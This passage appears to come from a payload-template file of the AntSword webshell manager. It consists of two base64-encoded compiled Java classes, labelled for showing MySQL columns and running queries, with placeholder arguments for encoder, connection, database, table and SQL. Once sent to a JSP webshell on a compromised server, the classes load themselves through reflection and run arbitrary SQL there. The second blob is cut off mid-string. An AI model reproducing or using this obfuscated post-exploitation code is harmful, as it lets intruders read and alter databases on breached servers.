    _: 'yv66vgAAADEBPQoATACHCQBpAIgJAGkAiQgAigkAaQCLCACMCQBpAI0IAI4JAGkAjwoAaQCQBwCRCgALAIcIAJIIAJMIAJQIAJUIAJYIAJcIAJgIAJkLAEcAmgsARgCbCwBHAJsLAEYAnAoAaQCdCQBpAJ4KAGkAnwoACwCgBwChBwCiCgAeAIcIAKMKAB4ApAoAHQClCgAeAKULAEcApgoACwClCgBpAKcKAKgAqQoAqgCrCgArAKwKACsArQcArgoAaQCvCgArALAIALEKACsAsggAswgAtAoAKwC1CgArALYKAEoAtwgAuAoAuQC6CwC7ALwLAL0AvgsAvwDACwDBAMILAMEAwwsAvwDECwC/AMUIAMYIAMcIAMgIAMkKAGkAygoATADLCgBKAMwHAM0HAM4HAM8IANAIANEHANIKAEoA0wcA1AoA1QDWCADXCABqCgBKANgKANkA2goA2QDbCABsBwDcCADdBwDeCQCqAN8KANUA2goASgDgCgCqAOEKAEoA4goA4wDkCgBMAKUIAOUKAOYA5wgA6AoAKwDpCADqCADrCgBKAOwIAHkIAO0IAO4KAEoA7wcA8AEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAxyYW5kb21QcmVmaXgBABBkZWNvZGVyQ2xhc3NkYXRhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABmRlY29kZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEACmV4ZWN1dGVTUUwBAG8oTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7WilMamF2YS9sYW5nL1N0cmluZzsBAAtzaG93Q29sdW1ucwEAXChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAIcGFyc2VPYmoBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAhhc291dHB1dAEAEkJhc2U2NERlY29kZVRvQnl0ZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAApTb3VyY2VGaWxlAQARU2hvd19jb2x1bW5zLmphdmEMAHMAdAwAagBrDABsAG0BAAZiYXNlNjQMAG4AbwEAD2FudHN3b3JkQ2hhcnNldAwAcABvAQAUYW50c3dvcmRyYW5kb21QcmVmaXgMAHEAbwwAgACBAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgEAAy0+fAEAA3w8LQEAEWFudHN3b3JkYXJnZW5jb2RlAQAPYW50c3dvcmRhcmdjb25uAQANYW50c3dvcmRhcmdkYgEAEGFudHN3b3JkYXJndGFibGUBABJhbnRzd29yZGFyZ2RlY29kZXIBAAl0ZXh0L2h0bWwMAPEA8gwA8wDyDAD0AHoMAHkAegwAcgBvDAB+AH8MAPUA9gEAE2phdmEvbGFuZy9FeGNlcHRpb24BABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACUVSUk9SOi8vIAwA9QD3DAD4APkMAPoA+wwAggB6BwD8DAD9APIHAP4MAP8BAAwBAQECDAB3AHgBABBqYXZhL2xhbmcvU3RyaW5nDACDAIQMAHMBAwEAAAwBBAD5AQACDQoBAAEKDAEFAQYMAQcBCAwBCQEKAQATJmNoYXJhY3RlckVuY29kaW5nPQcBCwwBDAENBwEODAEPARAHAREMARIBEwcBFAwBFQEWBwEXDAEYARkMARoBAgwBGwEcDAEdAQIBAAEJAQAPc2VsZWN0ICogZnJvbSBgAQADYC5gAQALYCBsaW1pdCAwLDAMAHwAfQwBHgEfDAEgARwBABNbTGphdmEvbGFuZy9PYmplY3Q7AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAdamF2YXguc2VydmxldC5qc3AuUGFnZUNvbnRleHQBAApnZXRSZXF1ZXN0AQAPamF2YS9sYW5nL0NsYXNzDAEhASIBABBqYXZhL2xhbmcvT2JqZWN0BwEjDAEkASUBAAtnZXRSZXNwb25zZQwBJgEnBwEoDAEpASoMASsBLAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQACW0IMAS0BLgwBLwEwDAExATIMATMBNAcBNQwBNgE3AQAMamF2YS52ZXJzaW9uBwE4DAE5AHoBAAMxLjkMAToBAAEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyDAE7ASIBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyDAE2ATwBABtkYXRhYmFzZS9teXNxbC9TaG93X2NvbHVtbnMBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAFHNldENoYXJhY3RlckVuY29kaW5nAQAMZ2V0UGFyYW1ldGVyAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBABFqYXZhL2xhbmcvSW50ZWdlcgEACHBhcnNlSW50AQAVKExqYXZhL2xhbmcvU3RyaW5nOylJAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAR0cmltAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAFmphdmEvc3FsL0RyaXZlck1hbmFnZXIBAA1nZXRDb25uZWN0aW9uAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zcWwvQ29ubmVjdGlvbjsBABNqYXZhL3NxbC9Db25uZWN0aW9uAQAPY3JlYXRlU3RhdGVtZW50AQAWKClMamF2YS9zcWwvU3RhdGVtZW50OwEAEmphdmEvc3FsL1N0YXRlbWVudAEADGV4ZWN1dGVRdWVyeQEAKChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL1Jlc3VsdFNldDsBABJqYXZhL3NxbC9SZXN1bHRTZXQBAAtnZXRNZXRhRGF0YQEAHigpTGphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhOwEAGmphdmEvc3FsL1Jlc3VsdFNldE1ldGFEYXRhAQAOZ2V0Q29sdW1uQ291bnQBAAMoKUkBAA1nZXRDb2x1bW5OYW1lAQAEbmV4dAEAAygpWgEACWdldFN0cmluZwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAB2lzQXJyYXkBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50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',
    [arg1]: '#{newbase64::encode}',
    [arg2]: '#{newbase64::conn}',
    [arg3]: '#{newbase64::db}',
    [arg4]: '#{newbase64::table}'
  },
  query: {
    _: 'yv66vgAAADEBXwoANwCUCQB1AJUJAHUAlggAlwkAdQCYCACZCQB1AJoIAJsJAHUAnAoAdQCdBwCeCgALAJQIAJ8IAKAIAKEIAKIIAKMIAKQIAKULAF4ApgsAXQCnCwBeAKcLAF0AqAoAdQCpCQB1AKoKAHUAqwoACwCsBwCtBwCuCgAdAJQIAK8KAB0AsAoAHACxCgAdALELAF4AsgoACwCxCgB1ALMKALQAtQoAtgC3CgAqALgKACoAuQcAugoAdQC7CgAqALwIAL0KAL4AvwgAwAgAwQoAKgDCCADDCgA1AMQIAMUHAMYKADUAxwcAyAoAyQDKCgA3AMsIAMwHAM0KACoAzggAzwoANQDQCgDRANIIANMIANQKACoA1QoAKgDWCADXCADYCgAqANkKACoA2ggA2woA3ADdCwDeAN8LAOAA4QsA4ADiCwDjAOQLAOUA5gsA5QDnCwDjAOgLAOMA6QoAdQDqCADrCwDgAOwIAO0KAB0A7ggA7wgA8AgA8QoAdQDyCgA1APMHAPQHAPUHAPYIAPcIAPgKADUA+QgA+ggAdgoANQD7CgD8AP0KAPwA/ggAeAcA/wgBAAkAtgEBCgDJAP0KADUBAgoAtgEDCgA1AQQKADcAsQgBBQgAhQgBBggBBwoANQEIBwEJAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2VuY29kZXIBABJMamF2YS9sYW5nL1N0cmluZzsBAAJjcwEADHJhbmRvbVByZWZpeAEAEGRlY29kZXJDbGFzc2RhdGEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAGZGVjb2RlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAMQmFzZTY0RW5jb2RlAQAKZXhlY3V0ZVNRTAEAbyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztaKUxqYXZhL2xhbmcvU3RyaW5nOwEABXF1ZXJ5AQBKKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAhwYXJzZU9iagEAFShMamF2YS9sYW5nL09iamVjdDspVgEACGFzb3V0cHV0AQASQmFzZTY0RGVjb2RlVG9CeXRlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAClNvdXJjZUZpbGUBAApRdWVyeS5qYXZhDAB/AIAMAHYAdwwAeAB5AQAGYmFzZTY0DAB6AHsBAA9hbnRzd29yZENoYXJzZXQMAHwAewEAFGFudHN3b3JkcmFuZG9tUHJlZml4DAB9AHsMAI0AjgEAFmphdmEvbGFuZy9TdHJpbmdCdWZmZXIBAAMtPnwBAAN8PC0BABFhbnRzd29yZGFyZ2VuY29kZQEAD2FudHN3b3JkYXJnY29ubgEADmFudHN3b3JkYXJnc3FsAQASYW50c3dvcmRhcmdkZWNvZGVyAQAJdGV4dC9odG1sDAEKAQsMAQwBCwwBDQCGDACFAIYMAH4AewwAiwCMDAEOAQ8BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAlFUlJPUjovLyAMAQ4BEAwBEQESDAETARQMAI8AhgcBFQwBFgELBwEXDAEYARkMARoBGwwAgwCEAQAQamF2YS9sYW5nL1N0cmluZwwAkACRDAB/ARwBAAxqYXZhLnZlcnNpb24HAR0MAR4AhgEAAAEAAzEuOQwBHwEZAQAQamF2YS51dGlsLkJhc2U2NAwBIAEhAQAKZ2V0RW5jb2RlcgEAD2phdmEvbGFuZy9DbGFzcwwBIgEjAQAQamF2YS9sYW5nL09iamVjdAcBJAwBJQEmDAEnASgBAA5lbmNvZGVUb1N0cmluZwEAAltCDAEpASoBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAErASwHAS0MAS4BLwEABmVuY29kZQEAAw18CgwBMAExDAEyARIBAAINCgEAAQoMATMBNAwBNQE2AQATJmNoYXJhY3RlckVuY29kaW5nPQcBNwwBOAE5BwE6DAE7ATwHAT0MAT4BPwwBQAFBBwFCDAFDAUQHAUUMAUYBRwwBSAEbDAFJAUoMAUsBGwwAiACGAQAGUmVzdWx0DAFMAUcBAA9Sb3dzIGNoYW5nZWQgPSAMAQ4BTQEALE5vIHJvd3MgY2hhbmdlZCBvciBzdGF0ZW1lbnQgd2FzIERETCBjb21tYW5kAQAFRmFsc2UBAAMJfAkMAIkAigwBTgFKAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAHWphdmF4LnNlcnZsZXQuanNwLlBhZ2VDb250ZXh0AQAKZ2V0UmVxdWVzdAwBTwEjAQALZ2V0UmVzcG9uc2UMAVABUQcBUgwBUwFUDAFVAVYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwwBVwFYDAFZAVoMAVsBXAwBXQEsAQAKZ2V0RGVjb2RlcgEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIMAS4BXgEAFGRhdGFiYXNlL215c3FsL1F1ZXJ5AQAOc2V0Q29udGVudFR5cGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwEADGdldFBhcmFtZXRlcgEABmFwcGVuZAEALChMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXByaW50AQARamF2YS9sYW5nL0ludGVnZXIBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAJY29tcGFyZVRvAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAApyZXBsYWNlQWxsAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAR0cmltAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABZqYXZhL3NxbC9Ecml2ZXJNYW5hZ2VyAQANZ2V0Q29ubmVjdGlvbgEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc3FsL0Nvbm5lY3Rpb247AQATamF2YS9zcWwvQ29ubmVjdGlvbgEAD2NyZWF0ZVN0YXRlbWVudAEAFigpTGphdmEvc3FsL1N0YXRlbWVudDsBABJqYXZhL3NxbC9TdGF0ZW1lbnQBAAdleGVjdXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAMZ2V0UmVzdWx0U2V0AQAWKClMamF2YS9zcWwvUmVzdWx0U2V0OwEAEmphdmEvc3FsL1Jlc3VsdFNldAEAC2dldE1ldGFEYXRhAQAeKClMamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGE7AQAaamF2YS9zcWwvUmVzdWx0U2V0TWV0YURhdGEBAA5nZXRDb2x1bW5Db3VudAEAAygpSQEADWdldENvbHVtbk5hbWUBAARuZXh0AQADKClaAQAJZ2V0U3RyaW5nAQAOZ2V0VXBkYXRlQ291bnQBABwoSSlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAHaXNBcnJheQEAEWdldERlY2xhcmVkTWV0aG9kAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7AQAOZ2V0Q29uc3RydWN0b3IBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwAhAHUANwAAAAYAAQB2AHcAAAABAHgAeQAAAAEAegB7AAAAAQB8AHsAAAABAH0AewAAAAEAfgB7AAAACQABAH8AgAABAIEAAABNAAIAAQAAACEqtwABKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACbEAAAABAIIAAAAaAAYAAAAIAAQACQAJAAoADgALABQADAAaAA0AAQCDAIQAAQCBAAABcAAFAAwAAADwKiu2AAq7AAtZtwAMTRINThIOOgQSDzoFEhA6BhIROgcSEjoIKrQAAxITuQAUAgAqtAACKrQAB7kAFQIAKrQAAyq0AAe5ABYCACoqtAACGQW5ABcCALYAGDoJKiq0AAIZBrkAFwIAtgAYOgoqKrQAAhkHuQAXAgC2ABg6CyoqKrQAAhkIuQAXAgC2ABi1ABksKhkJGQoZC7YAGrYAG1enACE6CSy7AB1ZtwAeEh+2ACAZCbYAIbYAILYAIrYAG1cqtAADuQAjAQC7AB1ZtwAeLbYAICostgAktgAltgAgGQS2ACC2ACK2ACanAAU6CQSsAAIAJACeAKEAHAC/AOkA7AAcAAEAggAAAF4AFwAAABIABQATAA0AFAAQABUAFAAWABgAFwAcABgAIAAZACQAHAAvAB0APAAeAEkAHwBaACAAawAhAHwAIgCPACMAngAmAKEAJACjACUAvwAoAOkAKgDsACkA7gArAAAAhQCGAAIAgQAAAHUABAAEAAAANQM9KrQACbgAJz0rHLYAKEynAAZOAz0qtAAFEgS2ACmZABS7ACpZKiu2ACsqtAAHtwAssCuwAAEAAgAQABMAHAABAIIAAAAmAAkAAAAvAAIAMQAKADIAEAA1ABMAMwAUADQAFgA2ACIANwAzADkAhwAAAAQAAQAcAAAAiACGAAEAgQAAAPwABgAGAAAAqBItuAAuTRIvTiwSMLYAMZsAShIyuAAzOgQZBBI0A70ANbYANhkEA70AN7YAODoFGQW2ADkSOgS9ADVZAxI7U7YANhkFBL0AN1kDK7YAPFO2ADjAACpOpwBDEj24ADM6BBkEA70ANbYAPgO9ADe2AD86BRkFtgA5EkAEvQA1WQMSO1O2ADYZBQS9ADdZAyu2ADxTtgA4wAAqTi0SQRIvtgBCTi2wThIvsAABAAYAowCkABwAAQCCAAAAOgAOAAAAPQAGAD8ACQBAABIAQQAZAEIALwBDAFYARABZAEUAYABGAHIARwCZAEkAogBKAKQASwClAEwAAACJAIoAAgCBAAACcwAEABEAAAHjEi86Byy2AEMSRBJFtgBGEkW2AEc6CBkIAzK2AEO4ADNXuwAdWbcAHhkIBDK2ACASSLYAICu2ACC2ACI6CRkJuABJOgoZCrkASgEAOgsZCy25AEsCADYMFQyZANAZC7kATAEAOg0ZDbkATQEAOg4VBpkAVAQ2DxUPGQ65AE4BAKMALxkOFQ+5AE8CADoQuwAdWbcAHhkHtgAgGRC2ACAZBLYAILYAIjoHhA8Bp//LuwAdWbcAHhkHtgAgGQW2ACC2ACI6BxkNuQBQAQCZAFsENg8VDxkOuQBOAQCjADMZDRUPuQBRAgA6ELsAHVm3AB4ZB7YAICoZELYAUrYAIBkEtgAgtgAiOgeEDwGn/8e7AB1ZtwAeGQe2ACAZBbYAILYAIjoHp/+hpwC6uwAdWbcAHhkHtgAgElO2ACAZBLYAIBkFtgAgtgAiOgcZC7kAVAEANg0VDZ4APLsAHVm3AB4ZB7YAICq7AB1ZtwAeElW2ACAVDbYAVrYAIrYAUrYAIBkEtgAgGQW2ACC2ACI6B6cAUxUNmgAquwAdWbcAHhkHtgAgKhJXtgBStgAgGQS2ACAZBbYAILYAIjoHpwAnuwAdWbcAHhkHtgAgKhJYtgBStgAgGQS2ACAZBbYAILYAIjoHGQewAAAAAQCCAAAAfgAfAAAAUgAEAFMAFgBUACEAVQA9AFYARABXAE0AWABXAFkAXABaAGUAWwBuAF0AcwBeAIIAXwCNAGAAqABeAK4AYgDEAGUAzgBmAN0AZwDoAGgBBwBmAQ0AagEmAGwBKQBtAUkAbgFSAG8BVwBwAZAAcQGVAHIBvAB0AeAAdwCHAAAABAABABwAAACLAIwAAgCBAAAANQAHAAYAAAAVElk6BBJEOgUqKywtGQQZBQS2AFqwAAAAAQCCAAAADgADAAAAewAEAHwACAB9AIcAAAAEAAEAHAABAI0AjgABAIEAAAFoAAQABgAAANwrtgA5tgBbmQAiK8AAXMAAXE0qLAMywABdtQACKiwEMsAAXrUAA6cAtRJfuAAzTSosEmADvQA1tgBhKwO9ADe2ADjAAF21AAIqLBJiA70ANbYAYSsDvQA3tgA4wABetQADpwB6TSvBAF2ZA